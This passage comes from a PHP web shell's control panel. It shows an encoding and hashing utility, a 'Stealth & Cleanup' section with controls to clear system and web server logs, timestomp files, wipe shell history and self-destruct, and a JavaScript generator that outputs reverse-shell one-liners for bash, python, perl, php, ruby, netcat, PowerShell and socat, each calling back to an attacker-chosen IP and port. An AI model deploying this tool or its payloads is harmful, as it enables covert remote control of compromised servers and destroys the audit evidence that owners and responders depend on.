                <td><span class="badge <?= $readable ? 'badge-green' : 'badge-red' ?>"><?= $readable ? 'READABLE' : 'No access' ?></span></td>
            </tr>
            <?php endforeach; ?>
        </table>
    </div></div>
</div>

<?php
// ============================================================
//  ENCODING UTILITIES
// ============================================================
elseif ($page === 'encoding'):
    $enc_input  = $_POST['enc_input'] ?? '';
    $enc_output = '';
    $enc_action = $_POST['enc_action'] ?? '';

    if ($enc_input !== '' && $enc_action !== '') {
        switch ($enc_action) {
            case 'b64_enc':   $enc_output = base64_encode($enc_input); break;
            case 'b64_dec':   $enc_output = base64_decode($enc_input); break;
            case 'hex_enc':   $enc_output = bin2hex($enc_input); break;
            case 'hex_dec':   $enc_output = @hex2bin(preg_replace('/\s+/', '', $enc_input)) ?: 'Invalid hex'; break;
            case 'url_enc':   $enc_output = urlencode($enc_input); break;
            case 'url_dec':   $enc_output = urldecode($enc_input); break;
            case 'html_enc':  $enc_output = htmlspecialchars($enc_input, ENT_QUOTES); break;
            case 'html_dec':  $enc_output = htmlspecialchars_decode($enc_input, ENT_QUOTES); break;
            case 'rot13':     $enc_output = str_rot13($enc_input); break;
            case 'md5':       $enc_output = md5($enc_input); break;
            case 'sha1':      $enc_output = sha1($enc_input); break;
            case 'sha256':    $enc_output = hash('sha256', $enc_input); break;
            case 'sha512':    $enc_output = hash('sha512', $enc_input); break;
            case 'crc32':     $enc_output = sprintf('%08x', crc32($enc_input)); break;
            default:          $enc_output = 'Unknown action';
        }
    }
?>

<div class="grid grid-2">
    <div class="panel"><div class="panel-head"><h3>Input</h3></div><div class="panel-body">
        <form method="post" id="encForm">
            <input type="hidden" name="enc_action" id="encAction" value="">
            <textarea name="enc_input" style="height:200px" placeholder="Enter text to encode/decode/hash..."><?= htmlspecialchars($enc_input) ?></textarea>
        </form>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>Output</h3></div><div class="panel-body">
        <textarea readonly style="height:200px;color:var(--accent)" id="encOutput"><?= htmlspecialchars($enc_output) ?></textarea>
        <button class="btn btn-sm" style="margin-top:8px" onclick="navigator.clipboard.writeText(document.getElementById('encOutput').value)">Copy</button>
    </div></div>
</div>

<div class="panel"><div class="panel-head"><h3>Operations</h3></div><div class="panel-body">
    <div style="display:flex;gap:8px;flex-wrap:wrap">
        <div style="flex:1;min-width:200px">
            <div style="color:var(--text2);font-size:10px;margin-bottom:6px;text-transform:uppercase">Encoding</div>
            <div style="display:flex;gap:4px;flex-wrap:wrap">
                <button class="btn btn-sm" onclick="doEnc('b64_enc')">Base64 Enc</button>
                <button class="btn btn-sm" onclick="doEnc('b64_dec')">Base64 Dec</button>
                <button class="btn btn-sm" onclick="doEnc('hex_enc')">Hex Enc</button>
                <button class="btn btn-sm" onclick="doEnc('hex_dec')">Hex Dec</button>
                <button class="btn btn-sm" onclick="doEnc('url_enc')">URL Enc</button>
                <button class="btn btn-sm" onclick="doEnc('url_dec')">URL Dec</button>
                <button class="btn btn-sm" onclick="doEnc('html_enc')">HTML Enc</button>
                <button class="btn btn-sm" onclick="doEnc('html_dec')">HTML Dec</button>
                <button class="btn btn-sm" onclick="doEnc('rot13')">ROT13</button>
            </div>
        </div>
        <div style="flex:1;min-width:200px">
            <div style="color:var(--text2);font-size:10px;margin-bottom:6px;text-transform:uppercase">Hashing</div>
            <div style="display:flex;gap:4px;flex-wrap:wrap">
                <button class="btn btn-sm" onclick="doEnc('md5')">MD5</button>
                <button class="btn btn-sm" onclick="doEnc('sha1')">SHA1</button>
                <button class="btn btn-sm" onclick="doEnc('sha256')">SHA256</button>
                <button class="btn btn-sm" onclick="doEnc('sha512')">SHA512</button>
                <button class="btn btn-sm" onclick="doEnc('crc32')">CRC32</button>
            </div>
        </div>
    </div>
</div></div>

<?php
// ============================================================
//  STEALTH & CLEANUP
// ============================================================
elseif ($page === 'stealth'): ?>

<div class="tabs" id="stealthTabs">
    <div class="tab active" data-tab="st-logs">Log Files</div>
    <div class="tab" data-tab="st-timestomp">Timestomp</div>
    <div class="tab" data-tab="st-history">History</div>
    <div class="tab" data-tab="st-destruct">Self-Destruct</div>
</div>

<div class="tab-content active" id="st-logs">
    <div class="panel"><div class="panel-head"><h3>Common Log Files</h3></div><div class="panel-body">
        <table class="tbl">
            <tr><th>Log File</th><th>Size</th><th>Writable</th><th>Action</th></tr>
            <?php
            $logs = [
                '/var/log/auth.log', '/var/log/syslog', '/var/log/messages',
                '/var/log/apache2/access.log', '/var/log/apache2/error.log',
                '/var/log/nginx/access.log', '/var/log/nginx/error.log',
                '/var/log/httpd/access_log', '/var/log/httpd/error_log',
                '/var/log/secure', '/var/log/faillog', '/var/log/lastlog',
                '/var/log/wtmp', '/var/log/btmp',
            ];
            foreach ($logs as $log):
                $exists = file_exists($log);
                $writable = is_writable($log);
                $size = $exists ? fmt_bytes(@filesize($log)) : '—';
            ?>
            <tr>
                <td style="font-size:11px"><?= htmlspecialchars($log) ?></td>
                <td><?= $exists ? $size : '<span style="color:var(--text2)">Not found</span>' ?></td>
                <td><span class="badge <?= $writable ? 'badge-green' : 'badge-red' ?>"><?= $writable ? 'Yes' : 'No' ?></span></td>
                <td>
                    <?php if ($exists): ?>
                    <form method="post" style="display:inline">
                        <input type="hidden" name="clear_log" value="<?= htmlspecialchars($log) ?>">
                        <button class="btn btn-sm btn-red" type="submit" onclick="return confirm('Clear this log?')">Clear</button>
                    </form>
                    <?php else: echo '—'; endif; ?>
                </td>
            </tr>
            <?php endforeach; ?>
        </table>
    </div></div>
</div>

<div class="tab-content" id="st-timestomp">
    <div class="panel"><div class="panel-head"><h3>Timestomp (Modify File Timestamps)</h3></div><div class="panel-body">
        <form method="post">
            <div class="form-row"><label>File</label><input type="text" name="ts_file" placeholder="/path/to/file" style="width:400px"></div>
            <div class="form-row"><label>Timestamp</label><input type="text" name="ts_time" placeholder="2023-01-15 08:30:00" style="width:200px"><span style="color:var(--text2);font-size:10px">YYYY-MM-DD HH:MM:SS</span></div>
            <button class="btn btn-green" type="submit">Apply Timestamps</button>
        </form>
        <div style="margin-top:12px;color:var(--text2);font-size:11px">Sets both access time and modification time to the specified date.</div>
    </div></div>
</div>

<div class="tab-content" id="st-history">
    <div class="panel"><div class="panel-head"><h3>Shell History</h3></div><div class="panel-body">
        <form method="post">
            <input type="hidden" name="clear_history" value="1">
            <p style="color:var(--text2);margin-bottom:12px;font-size:12px">Clears .bash_history, .zsh_history, .sh_history, .history and unsets HISTFILE.</p>
            <button class="btn btn-red" type="submit" onclick="return confirm('Clear all shell history files?')">Clear All History</button>
        </form>
        <?php
        $home = trim($_SERVER['HOME'] ?? run_cmd('echo $HOME'));
        $hist_files = ['.bash_history', '.zsh_history', '.sh_history'];
        foreach ($hist_files as $hf):
            $path = $home . '/' . $hf;
            if (file_exists($path)):
        ?>
        <div style="margin-top:16px">
            <div style="color:var(--cyan);font-size:11px;margin-bottom:6px"><?= htmlspecialchars($path) ?> (<?= fmt_bytes(filesize($path)) ?>)</div>
        </div>
        <?php endif; endforeach; ?>
    </div></div>
</div>

<div class="tab-content" id="st-destruct">
    <div class="panel" style="border-color:var(--red)"><div class="panel-head" style="border-color:var(--red)"><h3 style="color:var(--red)">⚠ Self-Destruct</h3></div><div class="panel-body">
        <p style="color:var(--red);margin-bottom:16px">This will permanently delete this shell file and destroy the session. This action cannot be undone.</p>
        <p style="color:var(--text2);margin-bottom:16px;font-size:11px">File: <?= htmlspecialchars(__FILE__) ?></p>
        <form method="post">
            <div class="form-row"><label style="color:var(--red)">Type CONFIRM</label><input type="text" name="self_destruct" placeholder="Type CONFIRM to proceed" style="width:200px;border-color:var(--red)"></div>
            <button class="btn btn-red" type="submit" onclick="return confirm('FINAL WARNING: Delete this shell permanently?')">Self-Destruct</button>
        </form>
    </div></div>
</div>

<?php endif; // end page routing ?>

</div><!-- /content -->
</div><!-- /main -->

<script>
// Tab switching
document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', function() {
        const group = this.parentElement;
        group.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        this.classList.add('active');
        const targetId = this.getAttribute('data-tab');
        let sibling = group.nextElementSibling;
        while (sibling && sibling.classList.contains('tab-content')) {
            sibling.classList.remove('active');
            if (sibling.id === targetId) sibling.classList.add('active');
            sibling = sibling.nextElementSibling;
        }
    });
});

// Reverse shell generator
function generateShell() {
    const ip = document.getElementById('rs_ip').value;
    const port = document.getElementById('rs_port').value;
    const type = document.getElementById('rs_type').value;
    const out = document.getElementById('rs_output');
    const shells = {
        'bash':       `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
        'bash2':      `0<&196;exec 196<>/dev/tcp/${ip}/${port}; sh <&196 >&196 2>&196`,
        'php':        `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
        'python':     `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
        'python3':    `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
        'perl':       `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
        'ruby':       `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
        'nc':         `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
        'nce':        `nc -e /bin/sh ${ip} ${port}`,
        'powershell': `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
        'socat':      `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip}:${port}`
    };
    out.value = shells[type] || 'Unknown type';
}

// Encoding form
function doEnc(action) {
    document.getElementById('encAction').value = action;
    document.getElementById('encForm').submit();
}

// Auto-generate shell on page load
if (document.getElementById('rs_output')) generateShell();

// Terminal scroll to bottom
const termOut = document.getElementById('termOutput');
if (termOut) termOut.scrollTop = termOut.scrollHeight;
</script>
</body></html>
